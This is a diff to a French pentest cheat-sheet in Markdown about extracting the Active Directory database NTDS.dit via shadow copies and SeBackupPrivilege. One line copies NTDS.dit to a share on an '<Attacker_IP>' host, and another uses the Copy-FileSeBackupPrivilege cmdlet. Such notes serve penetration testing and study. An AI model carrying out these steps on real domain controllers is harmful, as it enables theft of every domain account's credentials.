@@ -27,7 +27,6 @@ Successfully created shadow copy for 'C:\'
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
 ```
 
-
 ### Cliché instantanné (diskshadow.exe)
 
 #### Créer une Shadow Copy (cliché instantanné) du disque C
@@ -48,11 +47,14 @@ DISKSHADOW> exit
 
 #### Copier à partir du cliché instantanné
 
+**Remarque** :  Si le fichier n'est pas accessible et que l'on est membre du groupe *Backup Operator*, on pourra y accéder via le privilège **SeBackupPrivilege** (voir [[Privilèges Windows Exploitables]])
 
 ```
+# Ce cmdlet est lié à un outil référencé dans le lien ci-dessus
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
+## # 
 
 ## A distance
 
